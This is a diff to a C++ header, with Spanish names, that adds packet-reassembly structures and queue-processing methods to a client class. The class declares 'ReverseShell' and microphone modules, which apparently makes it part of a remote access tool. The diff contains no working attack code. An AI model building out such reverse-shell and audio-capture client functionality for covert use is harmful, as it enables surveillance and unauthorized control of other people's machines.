@@ -14,6 +14,11 @@ struct Paquete {
 	char cBuffer[PAQUETE_BUFFER_SIZE];
 };
 
+struct Paquete_Queue {
+	std::vector<char> cBuffer;
+	u_int uiTipoPaquete;
+};
+
 class ReverseShell;
 class Mod_Mic;
 
@@ -25,6 +30,7 @@ class Cliente {
 		std::mutex mtx_running;
 		std::mutex mtx_queue;
 		std::mutex mtx_kill;
+		std::mutex mtx_map_paquetes;
 
 		std::thread p_thQueue;
 
@@ -44,8 +50,11 @@ class Cliente {
 		std::ofstream ssArchivo;
 		FILE *fpArchivo = nullptr;
 
+		//Map para armar los paquetes entrantes
+		std::map<int, std::vector<char>> paquetes_Acumulados;
+
 		//Queue para comandos recibidos
-		std::queue<std::vector<char>> queue_Comandos;
+		std::queue<Paquete_Queue> queue_Comandos;
 
 		bool isRunning = true;
 		bool isQueueRunning = true;
@@ -124,10 +133,14 @@ class Cliente {
 
 		void iniPacket();
 
+		//Proceso de paquetes
 		void MainLoop();
 		void Process_Queue();
 		void Spawn_QueueMan();
-		void Procesar_Comando(std::vector<char>& cBuffer);
+		void Add_to_Queue(const Paquete_Queue& paquete);
+		void Procesar_Comando(const Paquete_Queue& paquete);
+		void Procesar_Paquete(const Paquete& paquete);
+		
 		void DestroyClasses();
 
 		bool m_isRunning() {
